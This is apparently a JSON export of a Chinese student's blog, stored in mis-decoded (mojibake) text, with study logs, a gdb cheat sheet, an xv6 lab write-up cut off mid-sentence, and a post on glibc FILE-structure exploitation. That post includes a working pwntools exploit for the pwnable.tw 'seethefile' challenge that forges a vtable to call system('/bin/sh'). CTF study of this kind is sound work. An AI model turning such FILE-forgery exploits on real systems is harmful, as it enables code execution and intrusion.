{"posts":[{"title":"2023.04","text":"å¿ƒè¡€æ¥æ½®æƒ³è¦è®°å½•è‡ªå·±çš„å­¦ä¹ è¿‡ç¨‹ï¼Œå¸Œæœ›èƒ½åšæŒä¸‹å» â€”â€” æ…Œä¹±çš„ä¸€ä¸ªæœˆ Week 1 (2023.04.01 - 2023.04.09)å‘ç° Rust åœ£ç»çš„ä¸­æ–‡è¯‘æœ¬ï¼Œå‡†å¤‡ä»¥æ­¤å­¦ä¹  Rustï¼Œå…¶ä»–æ–‡æ¡£ä½œä¸ºè¡¥å…… æœ¬æ¥æƒ³ç€è¾¹å­¦ Rust è¾¹åšç¬”è®°ï¼Œä½†æ˜¯å‘ç°é€Ÿåº¦æœ‰ç‚¹æ…¢ï¼Œæ¯•ç«Ÿ Rust åªæ˜¯è®­ç»ƒè¥çš„å‰ç½®æŠ€èƒ½ï¼ˆQAQï¼‰ è¿™å‘¨ä¹Ÿå¿™ç€å…¶ä»–äº‹æƒ…ï¼Œæ”¾åœ¨ Rust çš„æ—¶é—´ä¸å¤šï¼ˆéƒ½æ˜¯å€Ÿå£ï¼ï¼‰ å› æ­¤åªå†™äº†ä¸¤ç¯‡æ–‡ç« ï¼Œä¸€ç¯‡å…¥é—¨ï¼Œä¸€ç¯‡æ‰€æœ‰æƒï¼ˆå¦‚æœä½ çœ‹åˆ°æˆ‘äº†ï¼Œè¯´æ˜æ‰€æœ‰æƒè¿˜æ²¡æœ‰å†™å¥½ï¼‰ï¼Œä»¥åå¯èƒ½åªä¼šå†™ä¸€äº›æ¯”è¾ƒéœ€è¦æ³¨æ„çš„ç‚¹ï¼ˆäº‰å–å¤šå†™ç‚¹ğŸ•ŠğŸ•ŠğŸ•Šï¼‰ å’Œç¾¤å‹è®¨è®ºäº†ä¸‹ enum çš„ç‰¹ç‚¹ï¼Œå‘ç°å®ƒæ˜¯ä¸€ä¸ª tagged unionï¼ˆæˆ–è®¸åªæœ‰æˆ‘ä¸çŸ¥é“555ï¼‰ï¼Œäº†è§£äº†å®ƒçš„å†…å­˜å¸ƒå±€ Rustlings åšåˆ°äº† structsï¼Œè¦åŠ é€Ÿï¼ çœ‹å¯ä¿¡è®¡ç®—å¹³å°çš„æ–‡æ¡£ï¼Œè°ƒç ”å¯è¡Œæ€§ ä¸‹å‘¨æœŸæœ›ï¼š çœ‹å®Œ Rust åœ£ç» åšå®Œ Rustlings è°ƒç ”å¯ä¿¡è®¡ç®—å¹³å°çš„å¯è¡Œæ€§ Week 2 (2023.04.10 - 2023.04.16)æœç„¶ä¸Šä¸€å‘¨çš„å­½ï¼Œè¿™ä¸€å‘¨åŠ å€è¿˜ ä¸ºäº†èµ¶è¿›åº¦ï¼Œè‰è‰åšå®Œäº† Rustlingsï¼Œåœ£ç»è¿˜æ²¡ç»†çœ‹ ç»è®¨è®ºå‘ç°å¯ä¿¡è®¡ç®—å¹³å°çŸ­çŸ­å‡ ä¸ªæœˆæ—¶é—´æ ¹æœ¬å¼„ä¸å®Œï¼Œæ”¾å¼ƒäº† ä¸‹å‘¨æœŸæœ›ï¼š çœ‹å®Œ Rust åœ£ç» ä¸€å®šè¦ç»†çœ‹ï¼Œå¤šå†™å†™ä»£ç  å­¦ä¹  RISC-V æ¶æ„ éç‰¹æƒçº§æŒ‡ä»¤ ç‰¹æƒçº§æŒ‡ä»¤ é¡µè¡¨ Week 3 (2023.04.17 - 2023.04.23)ç”±äºèº«ä½“åŸå› ï¼Œå»åŒ»é™¢å»äº†å¥½å‡ è¶Ÿï¼ŒçœŸè´¹æ—¶é—´å•Š Rust è¿˜æ²¡çœ‹å®Œ ğŸ” å°±è·Ÿç€ OS è¯¾ç¨‹çœ‹äº†ä¸€é RISC-V è®²ä¹‰ æˆç»©å‡ºæ¥äº†ï¼Œå½»åº•æ”¾å¼ƒä¿ç ”æƒ³æ³•ğŸ˜­ï¼Œå‡†å¤‡æ‰¾å®ä¹ äº†ğŸ˜­ æŠ•äº† åœ°å¹³çº¿çš„åµŒå…¥å¼å¼€å‘ï¼Œç®€å†ç›´æ¥ ğŸ” äº† ğŸ˜° ç™¾åº¦çš„å®‰å…¨å·¥ç¨‹å¸ˆï¼Œç¬”è¯• ğŸ” äº†ï¼Œæ€ä¹ˆéƒ½æ˜¯ Web å®‰å…¨å•Š ğŸ˜¡ æ‹›è¡Œçš„æµ‹è¯•ï¼ˆï¼Ÿï¼‰ï¼Œä¸€é¢ ğŸ” äº† ä¸‹å‘¨æœŸæœ›ï¼š ç»§ç»­çœ‹ Rust åœ£ç» å¼€å§‹ rcore Week 4 (2023.04.24 - 2023.04.30)è¿™å‘¨æœ‰ç‚¹æ‘†ï¼Œå¥³æœ‹å‹å‡ºå»ç©æ ğŸ¥° æ€è€ƒäº†ä¸€ä¸‹å°±ä¸šæ–¹å‘ï¼Œå‡†å¤‡æ‰¾ Linux/OS å¼€å‘ åšäº†è£è€€çš„ OS å¼€å‘ç¬”è¯•ï¼Œå°±åšäº†ä¸€é“åŠ ğŸ˜­ï¼Œ æ„Ÿè§‰æœ‰ç‚¹æ‚¬ æ€»ç»“ç¨€é‡Œç³Šæ¶‚çš„ä¸€ä¸ªæœˆï¼Œç»å‰é¡¾åï¼Œæœ€åè¿˜æ˜¯å†³å®šå°±ä¸š ä¸‹æœˆæœŸæœ› çœ‹å®Œ Rust åœ£ç» ç»§ç»­å®Œæˆè½ä¸‹çš„ xv6 æ‹¿åˆ°ä¸€ä¸ªå®ä¹  offerï¼ˆçœŸçš„å¯ä»¥å—ï¼‰","link":"/2023/04/09/2023.04/"},{"title":"2023.05","text":"è½¬å¥½çš„äº”æœˆï¼ˆï¼Ÿï¼‰ Week 5 (2023.05.01 - 2023.05.07)å‡ºå»å®Œå›æ¥äº†ï¼Œå‰©ä¸‹å†ç©å‡ å¤© è£è€€ç¬”è¯•è¿‡äº†ğŸ˜‹ï¼Œä½†åˆ«é«˜å…´å¤ªæ—© æŠŠç¬”è¯•é¢˜ç”¨ Rust è¿‡ä¸€éï¼Œå‘ç°å…¨æ˜¯ç®€å•é¢˜ ğŸ˜…ï¼Œwsfw æŠ•äº†èè‹±ç­ï¼Œä»¥å‰æŠŠåå­å½“ä¿åº•ï¼Œç°åœ¨é«˜æ”€ä¸èµ· ğŸ˜­ ğŸ“ è¢«è–„çº±äº† ä¸‹å‘¨æœŸæœ›ï¼š Rust ç»§ç»­çœ‹ å¼€å§‹ xv6 Week 6 (2023.05.08 - 2023.05.14)å¼€å§‹ xv6 äº†ï¼Œä¸€å¼€å§‹çš„ Utilities å’Œ System calls è¿˜æ¯”è¾ƒç®€å•ï¼Œåˆ° Page tables çš„æ—¶å€™å› ä¸º RISC-V é¡µè¡¨çŸ¥è¯†å¿˜å¾—å·®ä¸å¤šäº†ï¼Œå‡†å¤‡å†å»çœ‹çœ‹ç¬”è®°å’Œè§†é¢‘ï¼Œå¤ä¹ ä¸€é è£è€€ä¸€é¢è¿‡äº†ğŸ˜‹ï¼Œåšäº†æ€§æ ¼æµ‹è¯•ï¼Œå¬è¯´ä¼šåˆ·äººï¼Œæœ‰ç‚¹æ…ŒğŸ˜° Rustlings è¿˜å‰©ä¸€ç‚¹ ä¸‹å‘¨æœŸæœ›ï¼š xv6 Page tablesã€Trapsã€COW Week 7 (2023.05.15 - 2023.05.21)çœ‹å®Œ Page tablesï¼Œæƒ³å†™ä¸€ä¸ª xv6 å‰–æï¼Œæ¯”å¦‚ç³»ç»Ÿè°ƒç”¨çš„å®ç°è¿‡ç¨‹ã€åˆ›å»ºä¸€ä¸ªè¿›ç¨‹çš„è¿‡ç¨‹ç­‰ç­‰ï¼Œå¸Œæœ›ä¸é¸½ è£è€€äºŒé¢äº†ï¼Œç¬¬ä¸€ä¸ªäºŒé¢çš„ä¼ä¸šï¼Œæ„Ÿè°¢è£è€€ï¼Œsoluteï¼ è£è€€å¯„äº†ğŸ˜­ å‡†å¤‡ä¸‹åå­é¢è¯• æœ€è¿‘å¼€å§‹å­¦ä¸‹äº”åéŸ³å›¾æ æ€è€ƒä¸€ä¸‹å­¦ä¹ æ—¶é—´å®‰æ’ï¼Œæ„Ÿè§‰åº”è¯¥åœ¨ä¸€æ®µæ—¶é—´é‡Œä¸“å¿ƒå­¦ä¸€ä»¶äº‹æƒ…ï¼Œæ¯”å¦‚ä¸¤å¤©å­¦ xv6ï¼Œä¸¤å¤©å­¦ rust è¿™æ · ä¸‹å‘¨æœŸæœ›ï¼š xv6 Trapsã€COW çœ‹ä¸€ä¸‹ Go çš„æ¼æ´æŒ–æ˜ çœ‹ä¸€ä¸‹ glibc malloc Week 8 (2023.05.22 - 2023.05.28)å¼€äº†ä¸ª xv6 å‰–æçš„å‘ï¼Œå†™äº†ç‚¹å†…å®¹ï¼Œæœ‰ç‚¹æˆå°±æ„ŸæğŸ˜‹ çœ‹äº†ä¼š Go çš„ Pwnï¼Œå‘ç°å¥½éš¾ o(â•¥ï¹â•¥)oï¼Œå¼€æ‘†äº† ç¨å¾®å¤ä¹ äº†ä¸‹ glibc å’Œ musl libc å°±å»é¢è¯•äº† çº¿ä¸‹é¢è¯•è¿˜è¦æ‰‹å†™ä»£ç ğŸ˜°ï¼Œåˆ¤æ–­ç´ æ•°ï¼Œå¿˜è®°éå†æ—¶æŠŠå¹³æ–¹æ ¹å¸¦è¿›å»äº†ï¼ˆåº”è¯¥æ²¡äº‹å§ï¼‰ å‘¨å…­ä¸€ä¸ŠåˆæŠŠåå­é¢å®Œäº†ï¼Œæœ¬æ¥ä»¥ä¸ºäºŒé¢ä¸‹åˆæ‰å¼€å§‹ï¼Œæ”¶æ‹¾å¥½ä¸œè¥¿åˆ°å®¿èˆäº†ï¼Œæ”¶åˆ°äºŒé¢å·²å¼€å§‹çš„é€šçŸ¥ï¼ˆæ€¥æ€¥æ€¥ï¼‰ï¼Œåˆèµ¶å›å»é¢è¯•äº† ä¸€é¢æ‰‹æ’•ç®€å•çš„æ‰¾æœ€å¤§å­ä¸²ï¼Œæ‰‹è´±è‡ªå·±å†™äº†ä¸ªä¾‹å­æ²¡é€šè¿‡ï¼Œé¢è¯•å®˜ç»™çš„ä¾‹å­å€’æ˜¯è¿‡äº†ï¼ˆ åå­ä½ â‘¨â‘¨æˆ‘å§ ä¸‹å‘¨æœŸæœ›ï¼š å„ç§è¯¾çš„ ddl xv6 ç»§ç»­ æ˜¯ä¸æ˜¯è¦å¼€å§‹é¢„ä¹ æœŸæœ«äº†ï¼ˆï¼Ÿï¼‰ Week 9 (2023.05.29 - 2023.05.31)æ‘†äº†ä¸‰å¤©ï¼Œåªå†™å®Œäº† ddl å¼€å§‹æŠ•å°å‚ æ€»ç»“è¿™ä¸ªæœˆåˆç†Ÿæ‚‰äº†ä¸€é xv6 å’Œ RISC-Vï¼Œç„¶åå®Œå–„äº†å¯¹åº”çš„æ–‡ç« ï¼Œç„¶åå¯¹ gdb ä¹Ÿæ›´ç†Ÿç»ƒäº†ï¼Œä¹‹å‰è¿˜ä¸çŸ¥é“æ€ä¹ˆå¯¹ç€æºç ä¸‹æ–­ç‚¹ å®ä¹ è¿˜æ˜¯ä¸€ç­¹è«å±•ï¼Œæ€¥æ€¥æ€¥ ä¸‹æœˆæœŸæœ› å‡†å¤‡å¤ä¹ é¢„ä¹ æœŸæœ« çªç ´ 0 offer æ—©ç¡æ—©èµ· xv6 çœ‹æƒ…å†µç»§ç»­","link":"/2023/05/10/2023.05/"},{"title":"FILE Exploration","text":"ç³»ç»Ÿåœ°å­¦ä¸€ä¸‹ glibc æ–‡ä»¶ç»“æ„çš„æ´ FILE ç»“æ„./libio/libio.h1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980struct _IO_FILE { int _flags; /* High-order word is _IO_MAGIC; rest is flags. */#define _IO_file_flags _flags /* The following pointers correspond to the C++ streambuf protocol. */ /* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */ char* _IO_read_ptr; /* Current read pointer */ char* _IO_read_end; /* End of get area. */ char* _IO_read_base; /* Start of putback+get area. */ char* _IO_write_base; /* Start of put area. */ char* _IO_write_ptr; /* Current put pointer. */ char* _IO_write_end; /* End of put area. */ char* _IO_buf_base; /* Start of reserve area. */ char* _IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno;#if 0 int _blksize;#else int _flags2;#endif _IO_off_t _old_offset; /* This used to be _offset but it's too small. */#define __HAVE_COLUMN /* temporary */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; /* char* _save_gptr; char* _save_egptr; */ _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE}; // ./libio/libioP.hstruct _IO_FILE_plus{ _IO_FILE file; const struct _IO_jump_t *vtable;};struct _IO_jump_t{ JUMP_FIELD(size_t, __dummy); JUMP_FIELD(size_t, __dummy2); JUMP_FIELD(_IO_finish_t, __finish); JUMP_FIELD(_IO_overflow_t, __overflow); JUMP_FIELD(_IO_underflow_t, __underflow); JUMP_FIELD(_IO_underflow_t, __uflow); JUMP_FIELD(_IO_pbackfail_t, __pbackfail); /* showmany */ JUMP_FIELD(_IO_xsputn_t, __xsputn); JUMP_FIELD(_IO_xsgetn_t, __xsgetn); JUMP_FIELD(_IO_seekoff_t, __seekoff); JUMP_FIELD(_IO_seekpos_t, __seekpos); JUMP_FIELD(_IO_setbuf_t, __setbuf); JUMP_FIELD(_IO_sync_t, __sync); JUMP_FIELD(_IO_doallocate_t, __doallocate); JUMP_FIELD(_IO_read_t, __read); JUMP_FIELD(_IO_write_t, __write); JUMP_FIELD(_IO_seek_t, __seek); JUMP_FIELD(_IO_close_t, __close); JUMP_FIELD(_IO_stat_t, __stat); JUMP_FIELD(_IO_showmanyc_t, __showmanyc); JUMP_FIELD(_IO_imbue_t, __imbue);#if 0 get_column; set_column;#endif}; _IO_FILE _flags è®°å½•æ–‡ä»¶æµçš„å±æ€§ Read only Append â€¦ Stream buffer Read buffer _IO_read_ptr _IO_read_end _IO_read_base Write buffer _IO_write_ptr _IO_write_end _IO_write_base Reserve buffer _IO_buf_base _IO_buf_end _fileno æ–‡ä»¶æè¿°ç¬¦ _chain FILE ç»“æ„ä½“æ˜¯ä¸€ä¸ªå°¾æ’æ³•å•å‘é“¾è¡¨ï¼Œé»˜è®¤æœ‰ stderr -&gt; stdout -&gt; stdin _lock é¿å…å¤šçº¿ç¨‹çš„æ¡ä»¶ç«äº‰ åœ¨æ”»å‡»æ—¶é€šå¸¸éœ€è¦æ„é€ å®ƒ ä½¿å…¶æŒ‡å‘ä¸€ä¸ªå…¨æ˜¯0çš„ç©ºé—´ _IO_FILE_plus stdin/stdout/stderr/fopen ä½¿ç”¨è¿™ä¸ªç»“æ„ä½“ _IO_FILE vtable æ‰€æœ‰å¯¹æ–‡ä»¶çš„æ“ä½œéƒ½æ˜¯é€šè¿‡ vtable fopen æµç¨‹ åˆ†é… FILE ç»“æ„ä½“ç©ºé—´ malloc åˆå§‹åŒ– FILE ç»“æ„ä½“ _IO_new_file_init_internal æŠŠ FILE ç»“æ„ä½“æ”¾å…¥é“¾è¡¨ _IO_link_in æ‰“å¼€æ–‡ä»¶ _IO_new_file_open sys_open fread æµç¨‹ å¦‚æœ stream buffer æ˜¯ç©ºçš„ vtable -&gt; _IO_file_xsgetn åˆ†é… buffer vtable -&gt; _IO_file_doallocate è¯»å–æ•°æ®åˆ° stream buffer ä¸­ vtable -&gt; _IO_file_underflow æŠŠæ•°æ®ä» stream buffer å¤åˆ¶åˆ°ç›®çš„åœ°å€ sys_read fwrite æµç¨‹ å¦‚æœ steam buffer æ˜¯ç©ºçš„ vtable -&gt; _IO_file_xsputn åˆ†é… buffer vtable -&gt; _IO_file_doallocate å¤åˆ¶ç”¨æˆ·æ•°æ®åˆ° stream buffer å¦‚æœ stream buffer æ»¡äº†æˆ–è€…è¦åˆ·æ–° steam bufferï¼Œå°† steam buffer çš„æ•°æ®å†™å…¥æ–‡ä»¶ sys_write fclose æµç¨‹ æŠŠ FILE ç»“æ„ä»é“¾è¡¨ä¸­ç§»é™¤ _IO_unlink_it åˆ·æ–°å¹¶é‡Šæ”¾ stream buffer _IO_new_file_close_it _IO_do_flush å…³é—­æ–‡ä»¶ sys_close é‡Šæ”¾ FILE ç»“æ„ vtable -&gt; _IO_file_finish free ä¼ªé€  vtableä¼ªé€  FILE ç»“æ„ï¼Œå°† vtable æŒ‡å‘æ„é€ çš„å‡½æ•° ä¿®æ”¹ _lock æŒ‡å‘ä¸€ä¸ªå…¨ä¸º 0 çš„å†…å­˜ æ‰¾åˆ° vtable çš„åç§» ä¿®æ”¹ vtable æŒ‡å‘å¯æ§çš„å†…å­˜ è°ƒè¯•æŸ¥çœ‹ close æ—¶ä¼š call çš„ä½ç½®å’Œ rdi å‚æ•° å°†å¯¹åº”ä½ç½®æ”¹æˆ system å’Œ /bin/sh æ³¨ï¼šä¸€èˆ¬ rdi çš„å€¼ä¸º _flags + åé¢å››ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥ä¸€èˆ¬å‰ 8 ä¸ªå­—èŠ‚è®¾ç½®ä¸º AAAA;sh; FSOPFile-Stream Oriented Programming æ§åˆ¶æ–‡ä»¶ç»“æ„é“¾è¡¨ _chain _IO_list_all å…¨å±€å˜é‡ï¼Œé“¾è¡¨å¤´ IO_flush_all_lockp ç”¨äºåˆ·æ–°æ‰€æœ‰ FILE çš„ç¼“å­˜ è°ƒç”¨æ¡ä»¶ å½“ libc æ‰§è¡Œ abort æ—¶ å½“æ‰§è¡Œ exit æ—¶ å½“ä» main è¿”å›æ—¶ åœ¨è°ƒç”¨æ—¶ï¼Œå¦‚æœ fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base ä¼šè°ƒç”¨ vtable-&gt;_IO_overflow House of Orange åˆ©ç”¨ Unsorted bin attack æŠŠ unsorted bin å†™åˆ° _IO_list_all æ„é€  0x60 å¤§å°çš„ chunk æ”¾å…¥ small bin è°ƒç”¨ _IO_flush_all_lockp æœ‰ 50% æ¦‚ç‡æŠŠ 0x60 å¤§å°çš„ chunk ä½œä¸º FILE ç»“æ„é€ æˆ FSOP Pwnable seethefile12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8046000) åˆ©ç”¨ç‚¹ è¯»å– /proc/self/maps å¾—åˆ° libc åœ°å€ åœ¨ case 5 çš„æ—¶å€™ name æº¢å‡ºè¦†ç›– fp åˆ° fake_fileï¼Œfclose(fp)æ—¶å°±å¯ä»¥ä½¿ç”¨ä¼ªé€ çš„ vtable ä¸»è¦éœ€è¦è°ƒè¯•æ‰¾åˆ° _lockã€vtable å’Œè°ƒç”¨ vtable ä¸­çš„å‡½æ•°çš„åç§» 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from pwn import *context(arch='i386', os='linux', log_level='debug')address = &quot;chall.pwnable.tw:10200&quot;.split(':')filename = &quot;./&quot; + __file__[0:-3]elf = ELF(__file__[0:-3])p = remote(address[0], address[1])# p = process(__file__[0:-3])libc = ELF(&quot;./libc_32.so.6&quot;)def fopen(filename): p.recvuntil(&quot;:&quot;) p.sendline(&quot;1&quot;) p.recvuntil(&quot;:&quot;) p.sendline(filename)def fread(): p.recvuntil(&quot;:&quot;) p.sendline(&quot;2&quot;)def fwrite(): p.recvuntil(&quot;:&quot;) p.sendline(&quot;3&quot;)def vuln_exit(name): p.recvuntil(&quot;:&quot;) p.sendline(&quot;5&quot;) p.recvuntil(&quot;:&quot;) p.sendline(name)addr_fake_file = elf.sym[&quot;name&quot;]addr_fp = elf.sym[&quot;fp&quot;]offset_fp = addr_fp - addr_fake_fileoffset_lock = 0x48 # fake_file + _offset_vtable = 0x94 # fake_file + _offset_call = 0x44 # addr_vtable + _fopen(&quot;/proc/self/maps&quot;)fread()fwrite()fread()fwrite()p.recvuntil(&quot;[heap]\\n&quot;)# addr_libc = int(p.recv(8), 16)addr_libc = int(p.recv(8), 16) + 0x1000# info(&quot;libc addr =&gt; &quot; + hex(addr_libc))addr_system = addr_libc + libc.sym[&quot;system&quot;]fake_file = b&quot;/bin/sh\\x00&quot; + p32(addr_system) * 6payload = (fake_file).ljust(offset_fp, b&quot;\\x00&quot;) + p32(addr_fake_file)payload = (payload).ljust(offset_lock, b&quot;\\x00&quot;) + p32(addr_fake_file + offset_vtable + 4)payload = (payload).ljust(offset_vtable, b&quot;\\x00&quot;) + p32(addr_fake_file + 8 - offset_call)# gdb.attach(p, &quot;b *0x8048b0f&quot;)vuln_exit(payload)p.recv()p.interactive()","link":"/2022/10/11/FILE%20Exploration/"},{"title":"Gdb å¸¸ç”¨å‘½ä»¤","text":"pwndbg + pwngdb + angelheap Gdb åŸç”Ÿå‘½ä»¤ c = continue ctrl-c å–æ¶ˆ ni = step æ±‡ç¼–çº§ n = step Cè¯­è¨€çº§ si = stepi b = break æ·»åŠ åœ°å€æ–­ç‚¹ï¼Œå½“è¿è¡Œåˆ°ç«¯ç‚¹ä¼šåœä¸‹æ¥ ç”¨ deleteï¼Œdisableï¼Œenable ä¿®æ”¹æ–­ç‚¹ watch æ·»åŠ å˜é‡æ–­ç‚¹ watch &lt;expression&gt; å½“å˜é‡æ”¹å˜æ—¶ä¼šåœä¸‹æ¥ watch -l &lt;address&gt; å½“åœ°å€æŒ‡å‘çš„å˜é‡æ”¹å˜æ—¶ä¼šåœä¸‹æ¥ rwatch -l &lt;address&gt; å½“åœ°å€æŒ‡å‘çš„å˜é‡è¢«è¯»å–æ—¶ä¼šåœä¸‹æ¥ watch var if xxx æ·»åŠ æ¡ä»¶ x/&lt;n/f/u&gt; &lt;addr&gt; æ‰“å°å†…å­˜åœ°å€ä¸­çš„å€¼ n è¡¨ç¤ºå†…å­˜å•å…ƒä¸ªæ•° f è¡¨ç¤ºè¾“å‡ºæ ¼å¼ i æ±‡ç¼– t äºŒè¿›åˆ¶æ ¼å¼ o å…«è¿›åˆ¶æ ¼å¼ d åè¿›åˆ¶æœ‰ç¬¦å·æ•´å‹ u åè¿›åˆ¶æ— ç¬¦å·æ•´å‹ x åå…­è¿›åˆ¶ï¼Œè¡¥é½å‰ç¼€ 0 a åå…­è¿›åˆ¶ï¼Œä¸è¡¥é½ f æµ®ç‚¹æ•° c å­—ç¬¦ s å­—ç¬¦ä¸² u è¡¨ç¤ºå†…å­˜å•å…ƒå¤§å° é»˜è®¤ä¸ºæœºå™¨å­—å¤§å° b è¡¨ç¤ºå•å­—èŠ‚ h è¡¨ç¤ºåŒå­—èŠ‚ w è¡¨ç¤ºå››å­—èŠ‚ g è¡¨ç¤ºå…«å­—èŠ‚ p/&lt;n/f/u&gt; = print æ‰“å° p *(struct elfhdr*) 0x10000 p *argv@argc æ‰“å°å‚æ•° info info registers æŸ¥çœ‹å¯„å­˜å™¨ info frame æŸ¥çœ‹å½“å‰æ ˆå¸§ä¿¡æ¯ info breakpoints æŸ¥çœ‹æ–­ç‚¹ info locals æŸ¥çœ‹æœ¬åœ°å˜é‡ info args æŸ¥çœ‹å‡½æ•°å‚æ•° frame &lt;n&gt; è·³è½¬åˆ°ä¸Šå±‚æ ˆå¸§ï¼Œé…åˆ i frame ä½¿ç”¨ list &lt;location&gt; æ‰“å°åœ°å€å¯¹åº”çš„å‡½æ•°çš„æºä»£ç  bt = backtrace æŸ¥çœ‹æ‰€æœ‰æ ˆå¸§ä¿¡æ¯ layout split è¿›å…¥åˆ†ç¦»æ¨¡å¼ï¼Œå¯ä»¥æŸ¥çœ‹å½“å‰è¿è¡Œçš„æºç å’Œåæ±‡ç¼– up &amp; down è¿›å…¥ä¸Š &amp; ä¸‹ä¸€çº§å‡½æ•° set ä¿®æ”¹å˜é‡æˆ–å¯„å­˜å™¨çš„å€¼ set var $pc=0x3ffffff000 å›æº¯è°ƒè¯• record å¼€å§‹è®°å½•è¿›ç¨‹çŠ¶æ€ reverse-* åŠ ä¸Šä¸€äº›å¸¸ç”¨çš„å‘½ä»¤ï¼Œå¯å®ç°åå‘è¿è¡Œ å¦‚ reverse-nextiï¼Œreverse-finish Pwndbg12345678910111213141516171819202122232425262728293031323334parseheap# æŸ¥çœ‹å †ä¸­ä½¿ç”¨æƒ…å†µpwndbg&gt; parseheapaddr prev size status fd bk0x603000 0x0 0x290 Used None None0x603290 0x0 0x20 Used None Nonebins# æŸ¥çœ‹ bin ä¸­æƒ…å†µpwndbg&gt; binstcachebins0x20 [ 1]: 0x6032c0 â—‚â€” 0x0fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x0smallbinsemptylargebinsemptyvispwndbg&gt; Angelheap123456789101112131415161718192021222324252627282930313233343536373839404142434445464748chunkinfo + chunkheader addresspwndbg&gt; chunkinfo 0x603000================================== Chunk info ==================================Status : UsedFreeable : Trueprev_size : 0x0size : 0x290prev_inused : 1is_mmap : 0non_mainarea : 0chunkptr + chunkdata addresspwndbg&gt; chunkptr 0x603010================================== Chunk info ==================================Status : UsedFreeable : Trueprev_size : 0x0size : 0x290prev_inused : 1is_mmap : 0non_mainarea : 0heapinfoæŸ¥çœ‹å †çš„æƒ…å†µpwndbg&gt; heapinfo(0x20) fastbin[0]: 0x0(0x30) fastbin[1]: 0x0(0x40) fastbin[2]: 0x0(0x50) fastbin[3]: 0x0(0x60) fastbin[4]: 0x0(0x70) fastbin[5]: 0x0(0x80) fastbin[6]: 0x0(0x90) fastbin[7]: 0x0(0xa0) fastbin[8]: 0x0(0xb0) fastbin[9]: 0x0 top: 0x6032d0 (size : 0x20d30) last_remainder: 0x0 (size : 0x0) unsortbin: 0x0(0x20) tcache_entry[0](1): 0x6032c0","link":"/2022/10/17/Gdb%20%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"title":"Lab2 System Calls","text":"å¼€å­¦ï¼ å®éªŒå¼€å§‹å‰123git fetchgit checkout syscallmake clean ä½¿ç”¨ gdb æŸ¥çœ‹ backtrace çš„è¾“å‡ºï¼Œå“ªä¸ªå‡½æ•°è°ƒç”¨äº† syscall usertrap() åœ¨ syscall è®¾ç½®æ–­ç‚¹åï¼Œè¾“å…¥ backtrace æŸ¥çœ‹æ ˆå›æº¯ p-&gt;trapframe-&gt;a7 çš„å€¼æ˜¯å¤šå°‘ï¼Œå€¼ä»£è¡¨ä»€ä¹ˆï¼Ÿ 7ï¼Œä»£è¡¨ç³»ç»Ÿè°ƒç”¨å· SYS_exec p/x *p-&gt;trapframe è¾“å‡º p çš„ trapframe å†…å®¹ CPU çš„ä¸Šä¸€ä¸ªæ¨¡å¼æ˜¯ä»€ä¹ˆï¼Ÿ ç”¨æˆ·æ¨¡å¼ p/x $sstatus è¾“å‡º sstatus å¯„å­˜å™¨çš„å€¼ï¼Œ0x22 åœ¨ kernel/riscv.h ä¸­æœ‰å®šä¹‰ï¼š#define SSTATUS_SPP (1L &lt;&lt; 8) // Previous mode, 1=Supervisor, 0=Userï¼Œä¹Ÿå¯ä»¥çœ‹ç»™çš„æ–‡æ¡£ è¿™é‡Œçš„ SPP ä½ä¸º 0ï¼Œå› æ­¤ä¸Šä¸€ä¸ªæ¨¡å¼æ˜¯ç”¨æˆ·æ¨¡å¼ ä»¤ num = * (int *) 0;ï¼Œkernel åœ¨å“ªæ¡æ±‡ç¼–æŒ‡ä»¤ panicï¼Œå“ªä¸ªå¯„å­˜å™¨å¯¹åº”å˜é‡ num lw a3, 0(zero)ï¼Œa3 æŸ¥çœ‹ panic æ—¶ spec å¯„å­˜å™¨çš„å€¼æŒ‡å‘å“ªä¸ªæ±‡ç¼– ä¸ºä»€ä¹ˆå†…æ ¸å´©æºƒäº†ï¼Ÿåœ¨å†…æ ¸åœ°å€ç©ºé—´ 0 åœ°å€æœ‰æ˜ å°„å—ï¼Ÿä¸Šé¢çš„ scause å€¼æ˜¯å¦è¯å®è¿™ä¸€ç‚¹ï¼Ÿ å› ä¸ºå°è¯•è¯»å– 0 åœ°å€ï¼Œå®ƒæ²¡æœ‰æœ‰æ•ˆæ˜ å°„ å¯„å­˜å™¨ scause è¡¨ç¤ºå‘ç”Ÿ trap çš„åŸå› ï¼Œè¿™é‡Œçš„ scause æ˜¯ 0xdï¼ŒæŸ¥çœ‹æ–‡æ¡£å¯ä»¥çŸ¥é“ï¼Œ0xd è¡¨ç¤º Load page faultï¼Œåˆç† å½“å†…æ ¸ panic æ—¶è¿›ç¨‹çš„åå­—æ˜¯ä»€ä¹ˆï¼Ÿè¿›ç¨‹ pid æ˜¯å¤šå°‘ï¼Ÿ â€œinitcodeâ€ï¼Œ1 ä¸€å¼€å§‹åšå› ä¸ºå¯„å­˜å™¨çš„å€¼ä¸äº†è§£ï¼Œè¿˜ä¸å¤ªèƒ½çœ‹æ‡‚æ–‡æ¡£ï¼Œæ²¡èƒ½ç†è§£ï¼Œè·³è¿‡äº†ï¼Œæœ‰äº›ç­”æ¡ˆæ˜¯åé¢æ›´æ–°çš„ ç–‘é—® è®¿é—®åˆ° 0 åœ°å€æ—¶ä¸ºä»€ä¹ˆä¼šè·³è½¬åˆ° kernelvec ä¸­ scauseã€sepcã€stval çš„å«ä¹‰ æ›´æ–°ï¼šè®¿é—® 0 å‘ç”Ÿäº† trapï¼Œéœ€è¦è·³è½¬åˆ°å¤„ç†å†…æ ¸ trap çš„ä½ç½®ï¼Œå³ 